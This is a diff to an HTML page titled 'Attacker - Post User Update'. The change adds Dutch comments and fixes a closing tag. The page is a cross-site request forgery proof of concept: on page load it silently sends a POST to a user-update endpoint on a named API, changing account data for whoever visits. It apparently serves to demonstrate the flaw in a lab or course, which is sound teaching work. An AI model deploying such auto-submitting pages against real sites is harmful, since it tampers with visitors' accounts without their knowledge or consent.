@@ -3,23 +3,34 @@
     <meta charset="UTF-8" />
     <title>Attacker - Post User Update</title>
     <script>
+        // Basisconfiguratie voor deze proof-of-concept pagina.
         const website = "https://safe-api.ian-chains.be/";
 
+        /**
+         * Schrijft een statusbericht naar de pagina en kleurt het resultaat.
+         */
         function set_status(message, type) {
+            // Stap 1: haal het status-element op.
             const el = document.getElementById('status');
             if (!el) {
                 return;
             }
 
+            // Stap 2: toon tekst en visuele feedback.
             el.textContent = message;
             el.style.color = type === 'error' ? '#b91c1c' : '#166534';
         }
 
+        /**
+         * Probeert automatisch user-gegevens te updaten met POST.
+         */
         async function post_update_user() {
+            // Stap 1: endpoint bepalen en status vooraf tonen.
             const url = website + "update/users";
             set_status('User aanpassen...', 'info');
 
             try {
+                // Stap 2: verstuur de POST-request met URL-encoded data.
                 const response = await fetch(url, {
                     method: "POST",
                     headers: { 'Content-Type': "application/x-www-form-urlencoded" },
@@ -30,6 +41,7 @@
                     })
                 });
 
+                // Stap 3: parse de response en verwerk statuscode.
                 const result = await response.json();
                 if (!response.ok) {
                     console.error('Status:', response.status, 'Error:', result);
@@ -37,15 +49,18 @@
                     return;
                 }
 
+                // Stap 4: meld succesvolle update.
                 console.log('User data updated successfully:', result);
                 set_status('User data succesvol aangepast.', 'success');
                 return;
             } catch (error) {
+                // Stap 5: netwerkfouten opvangen.
                 console.error(error);
                 set_status('Netwerkfout: ' + (error.message || String(error)), 'error');
             }
         }
 
+        // Start de actie automatisch bij paginalading.
         window.onload = () => {
             post_update_user();
         };
@@ -54,5 +69,5 @@
 <body>
 <h1 class="text-3xl font-bold mb-4">Post User Update</h1>
 <p id="status">Wachten op laden...</p>
-<body>
+</body>
 </html>
